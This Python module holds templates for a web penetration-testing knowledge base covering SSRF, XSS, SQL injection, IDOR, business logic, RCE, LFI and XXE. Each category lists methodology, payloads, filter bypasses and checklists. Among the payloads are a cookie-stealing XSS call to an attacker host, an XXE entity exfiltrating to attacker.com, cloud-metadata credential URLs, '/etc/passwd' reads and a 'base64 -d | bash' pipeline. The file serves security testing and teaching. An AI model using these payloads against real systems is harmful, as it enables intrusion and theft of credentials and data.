"""Knowledgebase category templates with methodology, vectors, and checklists."""

CATEGORY_TEMPLATES = {}

# === SSRF Template ===
CATEGORY_TEMPLATES["ssrf"] = {
    "title": "Server-Side Request Forgery (SSRF)",
    "description": "Exploiting server-side URL fetching to access internal resources.",
    "overview": (
        "SSRF occurs when an application fetches remote resources based on user-supplied URLs "
        "without proper validation. This can lead to accessing internal services, cloud metadata, "
        "port scanning, and in some cases remote code execution."
    ),
    "methodology": [
        {"title": "Identify URL Input Points", "description": "Find all parameters that accept URLs or fetch remote content (webhooks, image imports, PDF generators, URL previews).", "tools": ["Burp Suite", "ParamSpider", "Custom wordlist fuzzing"]},
        {"title": "Test Basic SSRF", "description": "Submit internal IPs (127.0.0.1, localhost, 169.254.169.254) and observe responses for differences.", "tools": ["Burp Collaborator", "interact.sh"]},
        {"title": "Bypass Filters", "description": "If basic payloads are blocked, try IP encoding (decimal, hex, octal), DNS rebinding, URL parsing differences, and protocol smuggling.", "tools": ["1u.ms (DNS rebinding)", "nip.io"]},
        {"title": "Escalate Impact", "description": "Access cloud metadata, internal APIs, databases, or chain with other vulns for RCE.", "tools": ["curl", "gopher://"]},
    ],
    "attack_vectors": [
        {"name": "Cloud Metadata", "description": "Access cloud provider metadata endpoints for credentials and configuration.", "example": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        {"name": "Internal Port Scanning", "description": "Use SSRF to scan internal network ports and discover services.", "example": "http://internal-host:PORT/"},
        {"name": "Protocol Smuggling", "description": "Use gopher:// or dict:// protocols to interact with internal services like Redis.", "example": "gopher://127.0.0.1:6379/_SET%20key%20value"},
        {"name": "DNS Rebinding", "description": "Use a domain that resolves to internal IPs to bypass allowlist checks.", "example": "http://A.169.254.169.254.1u.ms/"},
    ],
    "bypasses": [
        {"name": "Decimal IP", "description": "Convert IP to decimal format to bypass regex filters.", "payload": "http://2130706433/ (= 127.0.0.1)"},
        {"name": "IPv6 Loopback", "description": "Use IPv6 notation for localhost.", "payload": "http://[::1]/"},
        {"name": "Octal Encoding", "description": "Use octal IP encoding.", "payload": "http://0177.0.0.1/ (= 127.0.0.1)"},
        {"name": "URL Redirect", "description": "Use an open redirect on an allowed domain to reach internal targets.", "payload": "http://allowed.com/redirect?url=http://internal/"},
        {"name": "DNS Rebinding", "description": "Register a domain that alternates between external and internal IPs.", "payload": "http://rebind.attacker.com/"},
    ],
    "automation": [
        "Fuzz all URL-accepting parameters with SSRF payloads",
        "Monitor out-of-band DNS callbacks for blind SSRF detection",
        "Automate cloud metadata extraction upon successful SSRF",
        "Build custom wordlist of internal hostnames from recon",
    ],
    "checklist": [
        "Test all URL input parameters (url, uri, path, dest, redirect, callback, next, feed, host, site)",
        "Test PDF generators and file import features",
        "Try all IP bypass formats (decimal, hex, octal, IPv6)",
        "Test protocol handlers (gopher, dict, file, ldap)",
        "Check for blind SSRF with OOB callback",
        "Attempt cloud metadata access",
        "Test DNS rebinding if allowlist is present",
        "Check for partial SSRF (response headers/timing)",
    ],
    "references": [
        {"title": "OWASP SSRF", "url": "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"},
        {"title": "PayloadsAllTheThings SSRF", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"},
        {"title": "PortSwigger SSRF", "url": "https://portswigger.net/web-security/ssrf"},
    ],
}



# === XSS Template ===
CATEGORY_TEMPLATES["xss"] = {
    "title": "Cross-Site Scripting (XSS)",
    "description": "Injecting malicious scripts into web pages viewed by other users.",
    "overview": (
        "XSS allows attackers to inject client-side scripts into web pages. Types include "
        "Reflected (in URL/response), Stored (in database), and DOM-based (client-side JS). "
        "Impact ranges from cookie theft to full account takeover."
    ),
    "methodology": [
        {"title": "Identify Reflection Points", "description": "Find where user input is reflected in the page (search, error messages, user profiles, comments).", "tools": ["Burp Suite", "DalFox", "XSSStrike"]},
        {"title": "Determine Context", "description": "Identify if input lands in HTML body, attribute, JavaScript, URL, or CSS context.", "tools": ["Browser DevTools", "Burp Suite"]},
        {"title": "Craft Context-Specific Payload", "description": "Break out of the current context and execute JavaScript.", "tools": ["XSS payloads list", "Polyglot payloads"]},
        {"title": "Bypass Filters/WAF", "description": "Use encoding, case variation, event handlers, or alternative tags to bypass sanitization.", "tools": ["Burp Intruder", "Custom scripts"]},
        {"title": "Escalate Impact", "description": "Demonstrate account takeover, data theft, or admin actions via XSS.", "tools": ["BeEF", "Custom JS payloads"]},
    ],
    "attack_vectors": [
        {"name": "Reflected XSS", "description": "Input reflected in immediate server response.", "example": '"><script>alert(document.domain)</script>'},
        {"name": "Stored XSS", "description": "Input stored and rendered to other users.", "example": "<img src=x onerror=fetch('//attacker/'+document.cookie)>"},
        {"name": "DOM XSS", "description": "Client-side JavaScript processes untrusted data into dangerous sinks.", "example": "document.location.hash -> innerHTML"},
        {"name": "Template Injection", "description": "Angular/Vue/React template expressions evaluated.", "example": "{{constructor.constructor('alert(1)')()}}"},
    ],
    "bypasses": [
        {"name": "Event Handler Variations", "description": "Use less common event handlers that bypass filters.", "payload": "<details open ontoggle=alert(1)>"},
        {"name": "SVG/Math Tags", "description": "Use SVG or MathML namespace for script execution.", "payload": "<svg><animate onbegin=alert(1) attributeName=x>"},
        {"name": "Encoding", "description": "HTML entity, URL, or Unicode encoding to bypass filters.", "payload": "&lt;script&gt; or \\u0061lert(1)"},
        {"name": "JavaScript URI", "description": "Use javascript: protocol in href/src attributes.", "payload": "<a href=javascript:alert(1)>click</a>"},
    ],
    "automation": [
        "Crawl application and identify all reflection points",
        "Auto-test each reflection with context-appropriate payloads",
        "Use headless browser to verify JS execution",
        "Check Content-Security-Policy headers for bypasses",
    ],
    "checklist": [
        "Test all user input reflection points",
        "Test stored input areas (profiles, comments, messages)",
        "Check DOM sources and sinks",
        "Test file upload names and metadata",
        "Try SVG upload with embedded JS",
        "Check Content-Security-Policy bypass",
        "Test markdown/rich-text editors",
        "Verify HTTPOnly cookie flag",
    ],
    "references": [
        {"title": "OWASP XSS", "url": "https://owasp.org/www-community/attacks/xss/"},
        {"title": "PortSwigger XSS", "url": "https://portswigger.net/web-security/cross-site-scripting"},
        {"title": "XSS Cheat Sheet", "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"},
    ],
}



# === SQLi Template ===
CATEGORY_TEMPLATES["sqli"] = {
    "title": "SQL Injection (SQLi)",
    "description": "Injecting SQL commands through application inputs to manipulate databases.",
    "overview": (
        "SQL Injection occurs when user input is incorporated into SQL queries without proper "
        "sanitization. It can lead to data exfiltration, authentication bypass, data manipulation, "
        "and in some cases remote code execution via stacked queries or file operations."
    ),
    "methodology": [
        {"title": "Identify Injection Points", "description": "Test all parameters (GET, POST, headers, cookies) with SQL metacharacters (' \" ; --).", "tools": ["SQLMap", "Burp Suite"]},
        {"title": "Determine Database Type", "description": "Use error messages or behavior differences to fingerprint the DBMS.", "tools": ["SQLMap --dbs", "Manual testing"]},
        {"title": "Extract Data", "description": "Use UNION SELECT, error-based, blind, or time-based techniques to extract data.", "tools": ["SQLMap", "Custom scripts"]},
        {"title": "Escalate", "description": "Read files, write shells, execute commands (stacked queries, xp_cmdshell, INTO OUTFILE).", "tools": ["SQLMap --os-shell", "Manual"]},
    ],
    "attack_vectors": [
        {"name": "UNION-Based", "description": "Append UNION SELECT to extract data from other tables.", "example": "' UNION SELECT username,password FROM users--"},
        {"name": "Error-Based", "description": "Trigger database errors that reveal data.", "example": "' AND extractvalue(1,concat(0x7e,version()))--"},
        {"name": "Blind Boolean", "description": "Infer data through true/false response differences.", "example": "' AND (SELECT substring(password,1,1) FROM users LIMIT 1)='a'--"},
        {"name": "Time-Based Blind", "description": "Infer data through response time delays.", "example": "' AND IF(1=1,SLEEP(5),0)--"},
    ],
    "bypasses": [
        {"name": "Case Variation", "description": "Mix upper/lowercase to bypass simple filters.", "payload": "UnIoN SeLeCt"},
        {"name": "Inline Comments", "description": "Use MySQL inline comments to break up keywords.", "payload": "UN/**/ION SEL/**/ECT"},
        {"name": "Whitespace Alternatives", "description": "Replace spaces with alternatives.", "payload": "UNION%09SELECT%0A"},
        {"name": "Double URL Encoding", "description": "Double-encode characters to bypass WAF.", "payload": "%2527%2520OR%25201%253D1"},
    ],
    "automation": [
        "Use SQLMap with tamper scripts for WAF bypass",
        "Automate parameter discovery across all endpoints",
        "Build custom tamper scripts based on WAF behavior",
        "Chain with SSRF for internal database access",
    ],
    "checklist": [
        "Test all input parameters with SQL metacharacters",
        "Check numeric parameters (id, page, sort, limit)",
        "Test HTTP headers (X-Forwarded-For, Referer, Cookie)",
        "Try second-order injection (stored then executed)",
        "Test ORDER BY and GROUP BY clauses",
        "Attempt stacked queries",
        "Check for NoSQL injection variants",
        "Test JSON/XML body parameters",
    ],
    "references": [
        {"title": "OWASP SQL Injection", "url": "https://owasp.org/www-community/attacks/SQL_Injection"},
        {"title": "PortSwigger SQLi", "url": "https://portswigger.net/web-security/sql-injection"},
        {"title": "PayloadsAllTheThings SQLi", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"},
    ],
}



# === IDOR Template ===
CATEGORY_TEMPLATES["idor"] = {
    "title": "Insecure Direct Object References (IDOR)",
    "description": "Accessing unauthorized resources by manipulating object identifiers.",
    "overview": (
        "IDOR occurs when an application exposes references to internal objects (files, database records, "
        "user accounts) and fails to verify that the current user is authorized to access them. "
        "This can lead to unauthorized data access, modification, or deletion."
    ),
    "methodology": [
        {"title": "Map Object References", "description": "Identify all numeric IDs, UUIDs, filenames, or other references in URLs, bodies, and headers.", "tools": ["Burp Suite", "Autorize extension"]},
        {"title": "Test Horizontal Access", "description": "Replace your user's ID with another user's ID and check if access is granted.", "tools": ["Burp Autorize", "Multi-account testing"]},
        {"title": "Test Vertical Access", "description": "Try accessing admin resources/endpoints with a low-privilege account.", "tools": ["Burp Autorize", "Role-based testing"]},
        {"title": "Test ID Predictability", "description": "Check if IDs are sequential, UUID v1 (time-based), or otherwise guessable.", "tools": ["Burp Intruder", "Custom scripts"]},
    ],
    "attack_vectors": [
        {"name": "Horizontal Privilege Escalation", "description": "Access another user's data by changing user_id parameter.", "example": "GET /api/users/1234/profile -> /api/users/1235/profile"},
        {"name": "Vertical Privilege Escalation", "description": "Access admin functionality with regular user token.", "example": "POST /api/admin/users (with regular user session)"},
        {"name": "Object Reference in Body", "description": "Modify object IDs in POST/PUT request bodies.", "example": '{"order_id": "OTHER_USER_ORDER_ID"}'},
        {"name": "Path-Based IDOR", "description": "Access files/resources via manipulated paths.", "example": "GET /files/download?path=../other_user/secret.pdf"},
    ],
    "bypasses": [
        {"name": "UUID Prediction", "description": "UUID v1 contains timestamp - predict adjacent UUIDs.", "payload": "Enumerate nearby timestamps in UUID v1"},
        {"name": "Parameter Wrapping", "description": "Send ID in different formats (array, object, string vs int).", "payload": '{"id": ["1234"]} or {"id": {"$eq": "1234"}}'},
        {"name": "Endpoint Variation", "description": "Try /api/v1 vs /api/v2 or different HTTP methods.", "payload": "PUT /api/users/1234 vs PATCH /api/users/1234"},
        {"name": "GraphQL Aliases", "description": "Use GraphQL aliasing to fetch multiple objects at once.", "payload": "query { a: user(id:1) { email } b: user(id:2) { email } }"},
    ],
    "automation": [
        "Use Autorize (Burp extension) for automated access control testing",
        "Create two accounts and compare accessible resources",
        "Enumerate sequential IDs in all identified endpoints",
        "Test CRUD operations on objects belonging to other users",
    ],
    "checklist": [
        "Test all API endpoints with different user sessions",
        "Check both GET and POST/PUT/DELETE operations",
        "Test numeric and UUID-based identifiers",
        "Check file download/access endpoints",
        "Test batch/bulk operations for IDOR",
        "Verify authorization on GraphQL resolvers",
        "Test WebSocket messages for IDOR",
        "Check email/notification endpoints",
    ],
    "references": [
        {"title": "OWASP IDOR", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"},
        {"title": "PortSwigger Access Control", "url": "https://portswigger.net/web-security/access-control"},
        {"title": "HackTricks IDOR", "url": "https://book.hacktricks.xyz/pentesting-web/idor"},
    ],
}

# === Business Logic Template ===
CATEGORY_TEMPLATES["business_logic"] = {
    "title": "Business Logic Vulnerabilities",
    "description": "Exploiting flaws in application workflows and business rules.",
    "overview": (
        "Business logic vulnerabilities arise from flawed assumptions in application design. "
        "They cannot be detected by scanners and require understanding of the application's intended "
        "behavior. Examples include price manipulation, race conditions, and workflow bypasses."
    ),
    "methodology": [
        {"title": "Understand the Workflow", "description": "Map the complete business flow (signup, purchase, transfer, etc.) and identify assumptions.", "tools": ["Burp Suite", "Manual exploration"]},
        {"title": "Test Boundary Conditions", "description": "Test negative values, zero amounts, maximum integers, empty strings, and null values.", "tools": ["Burp Repeater", "Custom scripts"]},
        {"title": "Test Race Conditions", "description": "Send concurrent requests to exploit TOCTOU vulnerabilities.", "tools": ["Burp Turbo Intruder", "Python asyncio"]},
        {"title": "Bypass Steps", "description": "Skip steps in multi-step workflows, replay old requests, or manipulate state.", "tools": ["Burp Suite", "Session manipulation"]},
    ],
    "attack_vectors": [
        {"name": "Price Manipulation", "description": "Modify prices, quantities, or discount codes in purchase flows.", "example": '{"item_price": -100, "quantity": 0}'},
        {"name": "Race Condition", "description": "Exploit time-of-check vs time-of-use gaps.", "example": "Send 100 concurrent coupon redemption requests"},
        {"name": "Workflow Bypass", "description": "Skip verification steps in multi-step processes.", "example": "Jump from step 1 directly to step 3 in checkout"},
        {"name": "Referral Abuse", "description": "Self-refer or create circular referrals for rewards.", "example": "Register with own referral link using different email"},
    ],
    "bypasses": [
        {"name": "Negative Values", "description": "Use negative quantities or amounts to credit account.", "payload": '{"quantity": -1, "price": -100}'},
        {"name": "Integer Overflow", "description": "Use large numbers to trigger overflow conditions.", "payload": '{"amount": 99999999999999}'},
        {"name": "Rate Limit Bypass", "description": "Use different IP, headers, or slight request variations.", "payload": "X-Forwarded-For: random-ip"},
        {"name": "Currency Rounding", "description": "Exploit rounding errors in currency conversions.", "payload": "Transfer 0.001 repeatedly to accumulate rounding gains"},
    ],
    "automation": [
        "Script race condition tests with concurrent requests",
        "Automate coupon/promo code enumeration",
        "Build state machine models of workflows to find bypasses",
        "Monitor for balance/credit inconsistencies",
    ],
    "checklist": [
        "Test negative values in all numeric fields",
        "Test race conditions on critical operations (payments, transfers, votes)",
        "Skip steps in multi-step workflows",
        "Test coupon/discount code reuse and stacking",
        "Check referral program for self-referral",
        "Test currency conversion rounding",
        "Verify rate limits on sensitive actions",
        "Test file/data size limit enforcement",
    ],
    "references": [
        {"title": "OWASP Business Logic", "url": "https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability"},
        {"title": "PortSwigger Business Logic", "url": "https://portswigger.net/web-security/logic-flaws"},
        {"title": "HackTricks Race Condition", "url": "https://book.hacktricks.xyz/pentesting-web/race-condition"},
    ],
}



# === RCE Template ===
CATEGORY_TEMPLATES["rce"] = {
    "title": "Remote Code Execution (RCE)",
    "description": "Executing arbitrary code on the target server through application vulnerabilities.",
    "overview": (
        "RCE allows an attacker to execute arbitrary commands or code on the target system. "
        "It is typically the highest severity finding and can result from command injection, "
        "deserialization flaws, template injection, or file upload vulnerabilities."
    ),
    "methodology": [
        {"title": "Identify Injection Points", "description": "Find parameters processed by system commands, template engines, or code interpreters.", "tools": ["Burp Suite", "Commix"]},
        {"title": "Test Command Injection", "description": "Inject command separators (;, |, &&, ``, $()) and observe for execution.", "tools": ["Commix", "Burp Collaborator"]},
        {"title": "Test Deserialization", "description": "Identify serialized data in parameters/cookies and test for insecure deserialization.", "tools": ["ysoserial", "phar-deserialize"]},
        {"title": "Escalate", "description": "Establish reverse shell, read sensitive files, pivot internally.", "tools": ["netcat", "socat", "pwncat"]},
    ],
    "attack_vectors": [
        {"name": "Command Injection", "description": "Inject OS commands through vulnerable parameters.", "example": "; id; cat /etc/passwd"},
        {"name": "Template Injection (SSTI)", "description": "Inject template expressions that execute server-side code.", "example": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
        {"name": "Deserialization", "description": "Exploit insecure object deserialization for code execution.", "example": "Crafted Java/PHP/Python serialized objects"},
        {"name": "File Upload to RCE", "description": "Upload executable files (web shells) to accessible paths.", "example": "Upload .php file with system() call"},
    ],
    "bypasses": [
        {"name": "Command Separator Variants", "description": "Use different command separators.", "payload": "; | || & && \\n `cmd` $(cmd)"},
        {"name": "Wildcard Abuse", "description": "Use wildcards to bypass character filters.", "payload": "/bin/ca? /et?/pas?wd"},
        {"name": "Environment Variables", "description": "Use env vars to construct commands.", "payload": "${IFS} as space, $PATH manipulation"},
        {"name": "Encoding", "description": "Hex/octal/base64 encoding of commands.", "payload": "echo YmFzaCAtaSA... | base64 -d | bash"},
    ],
    "automation": [
        "Fuzz all parameters with command injection payloads",
        "Use OOB (DNS/HTTP) callbacks for blind command injection",
        "Scan for known deserialization gadgets in dependencies",
        "Test file upload extensions and content-type bypass",
    ],
    "checklist": [
        "Test parameters used in file operations or system calls",
        "Check for template injection (SSTI) in all inputs",
        "Test file upload for executable content",
        "Check serialized data (cookies, hidden fields)",
        "Test for code injection (eval, exec, preg_replace /e)",
        "Check for Log4Shell and similar library-level RCEs",
        "Test ImageMagick/FFmpeg processing for command injection",
        "Verify server-side input validation (not just client-side)",
    ],
    "references": [
        {"title": "OWASP Command Injection", "url": "https://owasp.org/www-community/attacks/Command_Injection"},
        {"title": "PortSwigger OS Command Injection", "url": "https://portswigger.net/web-security/os-command-injection"},
        {"title": "PayloadsAllTheThings RCE", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"},
    ],
}

# === LFI Template ===
CATEGORY_TEMPLATES["lfi"] = {
    "title": "Local File Inclusion (LFI)",
    "description": "Reading or including local files through path manipulation.",
    "overview": (
        "LFI allows attackers to read server files or include them for execution by manipulating "
        "file path parameters. Combined with log poisoning or wrappers, it can escalate to RCE."
    ),
    "methodology": [
        {"title": "Identify File Parameters", "description": "Find parameters that reference files (page, template, file, include, path, lang).", "tools": ["Burp Suite", "Custom wordlists"]},
        {"title": "Test Path Traversal", "description": "Use ../ sequences to escape the intended directory.", "tools": ["DotDotPwn", "Burp Intruder"]},
        {"title": "Test PHP Wrappers", "description": "Use php://filter, php://input, data:// for advanced exploitation.", "tools": ["Manual testing"]},
        {"title": "Escalate to RCE", "description": "Log poisoning, /proc/self/environ injection, or PHP filter chains.", "tools": ["PHP filter chain generator"]},
    ],
    "attack_vectors": [
        {"name": "Path Traversal", "description": "Navigate filesystem with ../ sequences.", "example": "../../etc/passwd"},
        {"name": "PHP Wrappers", "description": "Use PHP stream wrappers for source code disclosure or RCE.", "example": "php://filter/convert.base64-encode/resource=config.php"},
        {"name": "Log Poisoning", "description": "Inject code into log files, then include the log.", "example": "Inject PHP code via User-Agent, then include /var/log/apache2/access.log"},
        {"name": "Null Byte Injection", "description": "Truncate appended extension with null byte (older PHP).", "example": "../../etc/passwd%00"},
    ],
    "bypasses": [
        {"name": "Double Encoding", "description": "Double URL-encode traversal sequences.", "payload": "%252e%252e%252f"},
        {"name": "Path Truncation", "description": "Exceed max path length to truncate appended extensions.", "payload": "file" + "." * 4096},
        {"name": "Filter Bypass", "description": "Use variations to bypass ../ removal.", "payload": "....//....// or ..\\\\..\\\\"},
        {"name": "Null Byte", "description": "Terminate path before appended extension.", "payload": "../../etc/passwd%00.php"},
    ],
    "automation": [
        "Fuzz file parameters with traversal wordlists",
        "Automate PHP wrapper enumeration",
        "Test for common sensitive files (/etc/passwd, config files)",
        "Build a list of interesting files per technology stack",
    ],
    "checklist": [
        "Test all file path parameters with traversal sequences",
        "Try absolute paths (/etc/passwd)",
        "Test PHP wrappers (filter, input, data, expect)",
        "Check Windows paths (..\\\\..\\\\)",
        "Try double encoding and Unicode normalization",
        "Test null byte injection",
        "Attempt log file poisoning",
        "Check /proc/self/environ and /proc/self/fd/",
    ],
    "references": [
        {"title": "OWASP Path Traversal", "url": "https://owasp.org/www-community/attacks/Path_Traversal"},
        {"title": "PayloadsAllTheThings LFI", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"},
        {"title": "PHP Filter Chain RCE", "url": "https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it"},
    ],
}

# === XXE Template ===
CATEGORY_TEMPLATES["xxe"] = {
    "title": "XML External Entity (XXE)",
    "description": "Exploiting XML parsers to read files, perform SSRF, or achieve DoS.",
    "overview": (
        "XXE exploits applications that parse XML input. By defining external entities, attackers "
        "can read local files, perform SSRF, or cause denial of service. Modern frameworks often "
        "disable external entities by default, but legacy systems remain vulnerable."
    ),
    "methodology": [
        {"title": "Identify XML Input", "description": "Find endpoints accepting XML (Content-Type: application/xml, SOAP, SVG upload, XLSX/DOCX).", "tools": ["Burp Suite", "Content-Type fuzzing"]},
        {"title": "Test Basic XXE", "description": "Define an external entity referencing /etc/passwd and check response.", "tools": ["Manual testing", "Burp Repeater"]},
        {"title": "Test Blind XXE", "description": "Use OOB (out-of-band) exfiltration via HTTP or DNS.", "tools": ["Burp Collaborator", "interact.sh"]},
        {"title": "Escalate", "description": "Read sensitive config files, perform internal SSRF, or chain to RCE.", "tools": ["Custom DTD files", "PHP expect://"]},
    ],
    "attack_vectors": [
        {"name": "Classic XXE (File Read)", "description": "Define entity pointing to local file and include in response.", "example": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'},
        {"name": "Blind XXE (OOB)", "description": "Exfiltrate data via HTTP request to attacker server.", "example": '<!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=...">'},
        {"name": "XXE to SSRF", "description": "Use entity to make requests to internal services.", "example": '<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">'},
        {"name": "Billion Laughs (DoS)", "description": "Exponential entity expansion causing memory exhaustion.", "example": "Nested entity definitions expanding exponentially"},
    ],
    "bypasses": [
        {"name": "Content-Type Change", "description": "Change Content-Type to application/xml even if JSON expected.", "payload": "Content-Type: application/xml"},
        {"name": "SVG Upload", "description": "Embed XXE in SVG file upload.", "payload": '<svg xmlns="http://www.w3.org/2000/svg"><!ENTITY xxe SYSTEM "file:///etc/passwd">...</svg>'},
        {"name": "XLSX/DOCX", "description": "Inject XXE in Office XML files ([Content_Types].xml).", "payload": "Modify XML within ZIP-based office files"},
        {"name": "XInclude", "description": "Use XInclude when you cannot control DOCTYPE.", "payload": '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>'},
    ],
    "automation": [
        "Detect XML parsing by changing Content-Type header",
        "Fuzz file upload accepting XML-based formats (SVG, DOCX, XLSX)",
        "Use OOB server to detect blind XXE",
        "Test SOAP endpoints for XXE",
    ],
    "checklist": [
        "Test all endpoints accepting XML input",
        "Try changing Content-Type to application/xml",
        "Test file uploads (SVG, DOCX, XLSX, XML)",
        "Test SOAP/SAML endpoints",
        "Try XInclude when DOCTYPE is not controllable",
        "Test for blind XXE with OOB callback",
        "Check for error-based XXE",
        "Test parameter entities for exfiltration",
    ],
    "references": [
        {"title": "OWASP XXE", "url": "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"},
        {"title": "PortSwigger XXE", "url": "https://portswigger.net/web-security/xxe"},
        {"title": "PayloadsAllTheThings XXE", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"},
    ],
}
